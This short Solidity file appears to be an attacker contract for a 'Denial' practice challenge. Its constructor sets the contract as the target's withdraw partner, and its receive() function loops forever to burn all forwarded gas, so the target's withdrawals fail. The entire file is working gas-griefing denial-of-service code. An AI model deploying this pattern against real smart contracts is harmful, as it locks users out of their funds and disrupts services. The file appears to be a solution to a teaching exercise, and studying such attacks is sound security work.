// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Contract {
    Denial denial;

    constructor(address _denial) {
        denial = Denial(_denial);
        denial.setWithdrawPartner(address(this));
    }

    receive() external payable {
        while(true) {
            // lets burn some gas
        }
    }

}

interface Denial {
    function setWithdrawPartner(address) external;
}
